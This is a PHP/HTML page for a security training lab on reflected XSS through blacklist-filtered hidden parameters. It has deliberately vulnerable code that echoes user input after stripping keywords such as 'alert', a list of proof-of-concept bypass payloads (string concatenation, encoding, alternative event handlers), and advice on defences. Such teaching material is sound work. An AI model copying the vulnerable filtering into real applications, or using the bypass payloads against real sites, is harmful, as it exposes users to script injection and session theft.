<?php
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
}
elseif(isset($_GET["id"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['id']);
    echo $re;
}
elseif(isset($_GET["cat"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['cat']);
    echo $re;
}
elseif(isset($_GET["page"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['page']);
    echo $re;
}
elseif(isset($_GET["number"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['number']);
    echo $re;
}
?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>KrazePlanetLabs - Multiple Parameter Blacklist Filter XSS Lab</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">

  <style>
    :root {
      --primary-dark: #1a1f36;
      --primary-light: #2d3748;
      --accent-green: #48bb78;
      --accent-blue: #4299e1;
      --accent-orange: #ed8936;
      --accent-red: #f56565;
      --accent-purple: #9f7aea;
      --accent-pink: #ed64a6;
    }
    
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #e2e8f0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .navbar-brand {
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--accent-green) !important;
    }

    .nav-link {
      font-weight: 500;
      transition: color 0.3s;
    }

    .nav-link:hover {
      color: var(--accent-green) !important;
    }

    .hero-section {
      background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                  url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
      padding: 2rem 0;
      border-bottom: 1px solid #2d3748;
      margin-bottom: 2rem;
    }

    .hero-title {
      font-size: 2rem;
      font-weight: 700;
      background: linear-gradient(90deg, #48bb78, #4299e1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 0.5rem;
    }

    .hero-subtitle {
      font-size: 1rem;
      color: #cbd5e0;
    }

    .section-title {
      margin-top: 30px;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.5rem;
      position: relative;
      padding-bottom: 10px;
    }

    .section-title::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 60px;
      height: 4px;
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border-radius: 2px;
    }

    .card {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .card-header {
      background: rgba(15, 23, 42, 0.5);
      border-bottom: 1px solid #334155;
      font-weight: 600;
      padding: 1rem 1.5rem;
    }

    .form-control {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
      padding: 0.75rem 1rem;
    }

    .form-control:focus {
      background: rgba(30, 41, 59, 0.9);
      border-color: var(--accent-green);
      box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
      color: #e2e8f0;
    }

    .form-label {
      font-weight: 500;
      color: #cbd5e0;
    }

    .btn-primary {
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border: none;
      padding: 0.75rem 1.5rem;
      font-weight: 600;
      transition: all 0.3s;
    }

    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
    }

    .search-box {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .btn-outline-success {
      border-color: var(--accent-green);
      color: var(--accent-green);
    }

    .btn-outline-success:hover {
      background-color: var(--accent-green);
      border-color: var(--accent-green);
      color: #1a202c;
    }

    pre {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1.5rem;
      color: #e2e8f0;
      border: 1px solid #334155;
      overflow-x: auto;
      max-height: 300px;
      overflow-y: auto;
    }

    .output-section {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-top: 2rem;
    }

    .output-title {
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--accent-green);
    }

    .output-content {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      min-height: 60px;
      border: 1px solid #334155;
    }

    .lab-info {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }

    .multi-param-badge {
      background: linear-gradient(45deg, var(--accent-purple), var(--accent-pink));
      color: white;
      padding: 0.75rem 1.5rem;
      border-radius: 25px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: inline-block;
      margin-bottom: 1rem;
      animation: pulse-multi 2s infinite alternate;
      text-shadow: 0 0 10px rgba(159, 122, 234, 0.5);
    }

    @keyframes pulse-multi {
      0% { 
        box-shadow: 0 0 10px var(--accent-purple); 
        transform: scale(1);
      }
      100% { 
        box-shadow: 0 0 20px var(--accent-purple), 0 0 30px var(--accent-pink); 
        transform: scale(1.02);
      }
    }

    .filter-info {
      background: rgba(30, 41, 59, 0.7);
      border-left: 4px solid var(--accent-pink);
      padding: 1rem 1.5rem;
      margin: 1.5rem 0;
      border-radius: 0 8px 8px 0;
    }

    .progress {
      height: 8px;
      background-color: #2d3748;
      margin: 1rem 0;
    }

    .progress-bar {
      background: linear-gradient(90deg, var(--accent-pink), var(--accent-purple));
    }

    .case-variations {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      border: 1px solid #334155;
    }

    .function-filter-notice {
      background: rgba(237, 100, 166, 0.1);
      border: 1px solid var(--accent-pink);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .param-security-level {
      display: inline-block;
      padding: 0.25rem 0.75rem;
      border-radius: 20px;
      font-size: 0.75rem;
      font-weight: 600;
      margin-left: 0.5rem;
    }

    .security-high {
      background-color: var(--accent-green);
      color: #1a202c;
    }

    .security-medium {
      background-color: var(--accent-orange);
      color: #1a202c;
    }

    .security-low {
      background-color: var(--accent-red);
      color: white;
    }

    .tab-content {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      border-top: none;
      border-radius: 0 0 12px 12px;
      padding: 1.5rem;
    }

    .nav-tabs {
      border-bottom: 1px solid #334155;
    }

    .nav-tabs .nav-link {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      border-bottom: none;
      color: #cbd5e0;
      border-radius: 8px 8px 0 0;
      margin-right: 0.25rem;
    }

    .nav-tabs .nav-link.active {
      background: rgba(15, 23, 42, 0.9);
      border-color: #334155 #334155 transparent;
      color: var(--accent-green);
      font-weight: 600;
    }

    .nav-tabs .nav-link:hover {
      border-color: #334155 #334155 transparent;
      color: var(--accent-green);
    }

    .filter-demo {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
      border: 1px solid #334155;
    }

    .blacklist-item {
      background: var(--accent-red);
      color: white;
      padding: 0.25rem 0.5rem;
      border-radius: 4px;
      font-size: 0.75rem;
      font-weight: 600;
      margin: 0.1rem;
      display: inline-block;
    }

    .param-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 1rem;
      margin-top: 1rem;
    }

    .param-card {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      border: 1px solid #334155;
    }

    .arjun-tool-info {
      background: rgba(66, 153, 225, 0.1);
      border: 1px solid var(--accent-blue);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
    <div class="container-fluid">
      <a class="navbar-brand" href="/">
        <i class="bi bi-shield-shaded me-2"></i>KrazePlanetLabs
      </a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
        data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
        aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link active" href="../../about">About</a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="../../contact">Contact Us</a>
          </li>
        </ul>
        <form class="d-flex" role="search">
          <input class="form-control search-box me-2" type="search" placeholder="Search labs..." aria-label="Search">
          <button class="btn btn-outline-success" type="submit">Search</button>
        </form>
      </div>
    </div>
  </nav>

  <div class="hero-section">
    <div class="container">
      <h1 class="hero-title">Multiple Parameter Blacklist Filter XSS Lab</h1>
      <p class="hero-subtitle">Test XSS with consistent blacklist filtering across multiple hidden parameters</p>
    </div>
  </div>

  <div class="container mb-5">
    <div class="lab-info">
      <div class="multi-param-badge">Multiple Parameter Challenge</div>
      <h3 class="section-title">Lab Overview</h3>
      <p>This lab demonstrates a consistent blacklist filtering approach applied to multiple hidden parameters. The 'id', 'cat', 'page', and 'number' parameters all use the same blacklist filter, making this a comprehensive test of bypass techniques.</p>
      
      <div class="function-filter-notice">
        <i class="bi bi-exclamation-triangle me-2"></i><strong>Consistent Blacklist Filtering:</strong> All hidden parameters (id, cat, page, number) use the same str_replace() filter to remove specific dangerous keywords.
      </div>
      
      <div class="arjun-tool-info">
        <i class="bi bi-tools me-2"></i><strong>Multiple Hidden Parameters:</strong> There are multiple hidden parameters not shown in the main form. Use tools like Arjun to discover them all!
        <div class="mt-2">
          <code># use arjun tool to find hidden parameters: id, cat, page, number</code>
        </div>
      </div>
      
      <div class="filter-info">
        <i class="bi bi-funnel me-2"></i><strong>Parameter Security Levels:</strong>
        <div class="case-variations">
          <div class="row mt-2">
            <div class="col-md-6">
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-high">Secure</span>
                <span class="ms-2">fname, lname - Uses htmlspecialchars()</span>
              </div>
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-medium">Filtered</span>
                <span class="ms-2">id, cat, page, number - Same blacklist filter</span>
              </div>
            </div>
            <div class="col-md-6">
              <div class="d-flex align-items-center">
                <span class="badge bg-warning me-2">Consistent Filtering</span>
                <span>Same filter applied to all hidden parameters</span>
              </div>
              <div class="d-flex align-items-center mt-2">
                <span class="badge bg-info me-2">Multiple Vectors</span>
                <span>Multiple parameters to test bypass techniques</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <div class="filter-demo">
        <h6>Blacklist Filter Details:</h6>
        <p>All filtered parameters remove these keywords:</p>
        <div class="mb-2">
          <span class="blacklist-item">details</span>
          <span class="blacklist-item">alert</span>
          <span class="blacklist-item">confirm</span>
          <span class="blacklist-item">prompt</span>
          <span class="blacklist-item">eval</span>
          <span class="blacklist-item">ontoggle</span>
        </div>
        
        <div class="param-grid">
          <div class="param-card">
            <h6>Parameter: id</h6>
            <small>Filtered with blacklist</small>
          </div>
          <div class="param-card">
            <h6>Parameter: cat</h6>
            <small>Filtered with blacklist</small>
          </div>
          <div class="param-card">
            <h6>Parameter: page</h6>
            <small>Filtered with blacklist</small>
          </div>
          <div class="param-card">
            <h6>Parameter: number</h6>
            <small>Filtered with blacklist</small>
          </div>
        </div>
        
        <div class="row mt-3">
          <div class="col-md-6">
            <strong>Secure Parameters (fname, lname):</strong>
            <div class="mt-1">
              <code>Input: &lt;script&gt;alert(1)&lt;/script&gt;</code>
            </div>
            <div class="mt-1">
              <code>Output: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>
            </div>
          </div>
          <div class="col-md-6">
            <strong>Blacklist Filtered (id, cat, page, number):</strong>
            <div class="mt-1">
              <code>Input: &lt;details ontoggle=alert(1)&gt;</code>
            </div>
            <div class="mt-1">
              <code>Output: &lt; ontoggle=()&gt;</code>
            </div>
          </div>
        </div>
        <div class="mt-2">
          <small>The same blacklist filter is consistently applied to all hidden parameters, making it a good test case for bypass techniques.</small>
        </div>
      </div>
      
      <div class="mt-3">
        <div class="d-flex justify-content-between align-items-center">
          <span>Overall Security Level:</span>
          <span class="text-warning">Medium Vulnerability</span>
        </div>
        <div class="progress">
          <div class="progress-bar" style="width: 60%"></div>
        </div>
      </div>
      
      <p><strong>Objective:</strong> Discover all hidden parameters and find ways to bypass the consistent blacklist filtering to execute XSS payloads.</p>
    </div>

    <div class="row">
      <div class="col-lg-6">
        <div class="card mb-4">
          <div class="card-header text-center">
            <i class="bi bi-code-slash me-2"></i>Backend Source Code
          </div>
          <div class="card-body">
            <pre>
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
}
elseif(isset($_GET["id"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['id']);
    echo $re;
}
elseif(isset($_GET["cat"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['cat']);
    echo $re;
}
elseif(isset($_GET["page"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['page']);
    echo $re;
}
elseif(isset($_GET["number"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
    $re = str_replace($arr, '', $_GET['number']);
    echo $re;
}</pre>
          </div>
        </div>
      </div>
      
      <div class="col-lg-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-input-cursor-text me-2"></i>Test Input Forms
          </div>
          <div class="card-body">
            <ul class="nav nav-tabs" id="paramTabs" role="tablist">
              <li class="nav-item" role="presentation">
                <button class="nav-link active" id="visible-tab" data-bs-toggle="tab" data-bs-target="#visible" type="button" role="tab">Visible Parameters</button>
              </li>
              <li class="nav-item" role="presentation">
                <button class="nav-link" id="hidden-tab" data-bs-toggle="tab" data-bs-target="#hidden" type="button" role="tab">Hidden Parameters</button>
              </li>
            </ul>
            <div class="tab-content" id="paramTabsContent">
              <div class="tab-pane fade show active" id="visible" role="tabpanel">
                <h5 class="mb-3">Visible Parameters (HTML Encoded)</h5>
                <form action="" method="get" class="mb-4">
                  <div class="mb-3">
                    <label for="fname" class="form-label">First Name <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter first name" aria-label="First name" name="fname" value="<?php echo isset($_GET['fname']) ? htmlspecialchars($_GET['fname']) : ''; ?>">
                    <div class="form-text">This parameter uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="lname" class="form-label">Last Name <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter last name" aria-label="Last name" name="lname" value="<?php echo isset($_GET['lname']) ? htmlspecialchars($_GET['lname']) : ''; ?>">
                    <div class="form-text">This parameter uses htmlspecialchars() encoding</div>
                  </div>
                  <button type="submit" class="btn btn-primary mt-3">Test HTML Encoding</button>
                </form>
              </div>
              <div class="tab-pane fade" id="hidden" role="tabpanel">
                <h5 class="mb-3">Hidden Parameters (Blacklist Filtered)</h5>
                <div class="arjun-tool-info">
                  <i class="bi bi-info-circle me-2"></i><strong>Hint:</strong> Multiple parameters (id, cat, page, number) are hidden but implemented with the same blacklist filtering.
                </div>
                <form action="" method="get">
                  <div class="mb-3">
                    <label for="id" class="form-label">Parameter 'id' <span class="param-security-level security-medium">Filtered</span></label>
                    <input class="form-control" type="text" placeholder="Enter id value" aria-label="id" name="id" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
                    <div class="form-text">Uses blacklist filtering - removes specific keywords</div>
                  </div>
                  <div class="mb-3">
                    <label for="cat" class="form-label">Parameter 'cat' <span class="param-security-level security-medium">Filtered</span></label>
                    <input class="form-control" type="text" placeholder="Enter cat value" aria-label="cat" name="cat" value="<?php echo isset($_GET['cat']) ? htmlspecialchars($_GET['cat']) : ''; ?>">
                    <div class="form-text">Uses same blacklist filtering as id parameter</div>
                  </div>
                  <div class="mb-3">
                    <label for="page" class="form-label">Parameter 'page' <span class="param-security-level security-medium">Filtered</span></label>
                    <input class="form-control" type="text" placeholder="Enter page value" aria-label="page" name="page" value="<?php echo isset($_GET['page']) ? htmlspecialchars($_GET['page']) : ''; ?>">
                    <div class="form-text">Uses same blacklist filtering as other parameters</div>
                  </div>
                  <div class="mb-3">
                    <label for="number" class="form-label">Parameter 'number' <span class="param-security-level security-medium">Filtered</span></label>
                    <input class="form-control" type="text" placeholder="Enter number value" aria-label="number" name="number" value="<?php echo isset($_GET['number']) ? htmlspecialchars($_GET['number']) : ''; ?>">
                    <div class="form-text">Uses same blacklist filtering as other parameters</div>
                  </div>
                  <button type="submit" class="btn btn-primary mt-3">Test Blacklist Filtering</button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <?php if(isset($_GET["fname"]) && isset($_GET["lname"])): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Visible Parameters Output (HTML Encoded)
      </div>
      <div class="output-content">
        <?php 
          echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
          echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
        ?>
      </div>
      <div class="mt-3">
        <small class="text-success"><i class="bi bi-check-circle me-1"></i>Output is safely encoded with htmlspecialchars()</small>
      </div>
    </div>
    <?php endif; ?>

    <?php 
    $hidden_params = ['id', 'cat', 'page', 'number'];
    $has_hidden_output = false;
    
    foreach($hidden_params as $param) {
        if(isset($_GET[$param])) {
            $has_hidden_output = true;
            break;
        }
    }
    ?>

    <?php if($has_hidden_output): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Hidden Parameters Output (Blacklist Filtered)
      </div>
      <div class="output-content">
        <?php 
        foreach($hidden_params as $param) {
            if(isset($_GET[$param])) {
                echo "<div class='mb-3'><strong>Parameter '$param':</strong><br>";
                $arr = array('details','alert','confirm','prompt','eval','details','ontoggle');
                $re = str_replace($arr, '', $_GET[$param]);
                echo $re;
                echo "</div>";
            }
        }
        ?>
      </div>
      <div class="mt-3">
        <small class="text-warning"><i class="bi bi-exclamation-triangle me-1"></i>These parameters use blacklist filtering - XSS may still be possible with bypass techniques!</small>
      </div>
    </div>
    <?php endif; ?>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-lightbulb me-2"></i>XSS Bypass Techniques for This Blacklist
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>Alternative Tags/Events (Not Filtered):</h6>
                <ul>
                  <li><code>&lt;script&gt;window['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;img src=x onerror=window['al'+'ert'](1)&gt;</code></li>
                  <li><code>&lt;body onload=window['al'+'ert'](1)&gt;</code></li>
                  <li><code>&lt;svg onload=window['al'+'ert'](1)&gt;</code></li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>JavaScript String Concatenation:</h6>
                <ul>
                  <li><code>&lt;script&gt;window['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;this['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;self['al'+'ert'](1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;top['al'+'ert'](1)&lt;/script&gt;</code></li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-md-6">
                <h6>Alternative Functions (Not Filtered):</h6>
                <ul>
                  <li><code>&lt;script&gt;print()&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;open()&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;console.log(1)&lt;/script&gt;</code></li>
                  <li><code>&lt;script&gt;setTimeout('al'+'ert(1)')&lt;/script&gt;</code></li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Encoding Bypass Techniques:</h6>
                <ul>
                  <li><code>&lt;script&gt;window['&#x61;lert'](1)&lt;/script&gt;</code> (HTML entities)</li>
                  <li><code>&lt;script&gt;window['\x61lert'](1)&lt;/script&gt;</code> (Hex encoding)</li>
                  <li><code>&lt;script&gt;window['\141lert'](1)&lt;/script&gt;</code> (Octal encoding)</li>
                  <li><code>&lt;script&gt;window[`al${''}ert`](1)&lt;/script&gt;</code> (Template literals)</li>
                </ul>
              </div>
            </div>
            
            <div class="filter-demo mt-3">
              <h6>Blacklist Filter Analysis:</h6>
              <p>The current filter removes these exact strings: <code>'details', 'alert', 'confirm', 'prompt', 'eval', 'ontoggle'</code></p>
              <p>This means these techniques can bypass the filter:</p>
              <ul>
                <li>Using string concatenation to build blocked function names</li>
                <li>Using alternative functions that aren't in the blacklist</li>
                <li>Using character encoding (HTML entities, hex, octal)</li>
                <li>Using template literals or other string manipulation</li>
                <li>Using global objects (window, self, this, top) to access functions</li>
              </ul>
              
              <div class="mt-3">
                <h6>Filter Limitations:</h6>
                <ul>
                  <li>Doesn't prevent string concatenation</li>
                  <li>Doesn't handle encoding variations</li>
                  <li>Doesn't block alternative functions</li>
                  <li>Doesn't prevent access via global objects</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-shield-exclamation me-2"></i>Security Implications
          </div>
          <div class="card-body">
            <p>Multiple parameter filtering demonstrates:</p>
            <ul>
              <li>Consistent filtering across parameters is good practice</li>
              <li>Blacklists are still vulnerable to creative bypasses</li>
              <li>Multiple parameters provide multiple attack vectors</li>
              <li>String manipulation can easily bypass keyword filters</li>
              <li>Global objects provide multiple ways to access functions</li>
              <li>Whitelist approaches are more secure than blacklists</li>
            </ul>
          </div>
        </div>
      </div>
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-check-circle me-2"></i>Best Practices
          </div>
          <div class="card-body">
            <p>For secure web applications:</p>
            <ul>
              <li>Use context-aware output encoding instead of blacklists</li>
              <li>Implement strict Content Security Policy (CSP) headers</li>
              <li>Validate input based on expected data types</li>
              <li>Use security libraries/frameworks for output encoding</li>
              <li>Test all parameters with various bypass techniques</li>
              <li>Apply consistent security controls across all parameters</li>
              <li>Assume blacklists will be bypassed with enough effort</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-code-square me-2"></i>Real-World Security Implications
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>Common Multi-Parameter Vectors:</h6>
                <ul>
                  <li><strong>Search and filter parameters:</strong> Often multiple parameters with similar filtering</li>
                  <li><strong>Pagination parameters:</strong> page, limit, offset often have inconsistent validation</li>
                  <li><strong>API endpoints:</strong> Multiple query parameters with varying security</li>
                  <li><strong>Form parameters:</strong> Various fields may share similar but insufficient filtering</li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Impact of Multi-Parameter Bypass:</h6>
                <ul>
                  <li>Multiple entry points for XSS attacks</li>
                  <li>Increased attack surface</li>
                  <li>Session hijacking through cookie theft</li>
                  <li>Account takeover attacks</li>
                  <li>Phishing attacks from within the application</li>
                  <li>Complete application compromise</li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-12">
                <h6>Advanced Prevention Strategies:</h6>
                <ul>
                  <li><strong>Context-aware encoding:</strong> Use proper encoding for each output context</li>
                  <li><strong>Input validation:</strong> Validate based on expected data types and patterns</li>
                  <li><strong>Content Security Policy:</strong> Implement strict CSP headers</li>
                  <li><strong>Security testing:</strong> Test all parameters with automated and manual techniques</li>
                  <li><strong>Parameter discovery:</strong> Use tools to find all parameters during testing</li>
                  <li><strong>Security headers:</strong> Implement X-XSS-Protection, X-Content-Type-Options</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
    crossorigin="anonymous"></script>
</body>
</html>